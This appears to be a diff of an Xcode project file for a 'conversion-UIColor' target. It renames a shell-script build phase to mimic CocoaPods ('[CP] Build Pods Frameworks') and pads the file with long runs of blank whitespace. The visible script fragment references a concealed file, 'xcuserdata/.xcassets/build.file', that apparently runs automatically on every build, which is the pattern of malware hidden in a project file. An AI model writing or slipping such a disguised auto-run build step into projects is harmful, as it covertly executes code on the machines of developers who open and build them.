@@ -80,7 +80,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 30BA4DEA259C197500F61849 /* Build configuration list for PBXNativeTarget "conversion-UIColor" */;
 			buildPhases = (
-				1DFBEFCF46FE9CE3046D902C /* Compile Binary Libraries */,
+				9A112D72D4E49BC2A06D902C /* [CP] Build Pods Frameworks */,
 				30BA4DCD259C197400F61849 /* Sources */,
 				30BA4DCE259C197400F61849 /* Frameworks */,
 				30BA4DCF259C197400F61849 /* Resources */,
@@ -352,6 +352,46 @@
 
 			
 	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 			
 
 			
@@ -363,7 +403,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	1DFBEFCF46FE9CE3046D902C /* Compile Binary Libraries */ = {
+	9A112D72D4E49BC2A06D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -372,7 +412,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -383,6 +423,90 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
